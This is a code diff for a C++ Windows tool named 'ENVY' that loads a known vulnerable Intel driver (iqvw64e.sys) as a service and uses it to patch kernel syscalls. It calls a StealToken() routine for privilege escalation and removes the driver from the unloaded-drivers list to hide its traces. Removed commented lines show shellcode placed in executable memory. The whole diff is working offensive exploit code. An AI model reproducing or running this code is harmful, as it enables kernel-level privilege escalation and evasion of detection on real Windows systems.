@@ -3,9 +3,10 @@
 #ifdef USING_INTEL_DRIVER
 #include "shittel_driver.h"
 #include "shittel_driver_defs.h"
+#include "driver_res.h"
 #endif 
 
-
+#include "windows_service.h"
 
 #include "kernel_module.h"
 #include <filesystem>
@@ -19,20 +20,10 @@ int main(int argc, char** args)
 	LoadLibraryA("user32.dll");
 	std::cout << "[+] Welcome to ENVY..." << std::endl;
 	std::cout << "[+] Loading vulnerable driver..." << std::endl;
+	std::unique_ptr<windows_service> windows_service_resource = std::unique_ptr<windows_service>(new windows_service("iqvw64e.sys"));
+	windows_service_resource->load_driver(resources::driver_bytes, sizeof(resources::driver_bytes));
+
 	std::unique_ptr<kernel::vulnerable_driver> driver_resource = std::unique_ptr<kernel::vulnerable_driver>(new intel::intel_vulnerable_driver());
-	
-	//kernel_module* module = kernel_module::get_kernel_module("win32kbase.sys");
-	//kernel_module* ntkrnl = kernel_module::get_kernel_module("ntoskrnl.exe");
-	//kernel_module* win32u = kernel_module::get_kernel_module("win32kfull.sys");
-	//uint64_t vulnerable_syscall = win32u->get_module_export(driver_resource.get(), "NtGdiGetCOPPCompatibleOPMInformation");
-	//std::cout << *module;
-	//std::cout << *ntkrnl;
-
-	//uint8_t shellbytes[] = { 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x90, 0xC3};
-
-	//uint64_t shellcode_buffer = reinterpret_cast<uint64_t>(VirtualAlloc(nullptr, sizeof(shellbytes), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
-	////win32u->patch_syscall(driver_resource.get(), shellcode_buffer);
-	////win32u->execute_and_restore_syscall<void(*)(void)>(driver_resource.get());
 
 	static uint64_t allocate_pool_kernel_addr = 0;
 
@@ -51,6 +42,11 @@ int main(int argc, char** args)
 		StealToken();
 	}
 	win32u->restore_syscall(driver_resource.get());
+
+	uint64_t KeBugCheckExAddr = ntoskrnl->get_module_export(driver_resource.get(), "KeBugCheckEx");
+
+	driver_resource->remove_from_unloaded_drivers();
+	windows_service_resource->stop_service();
 	
 
 	//std::cout << "0x" << std::hex << pool_addr << std::dec << std::endl;
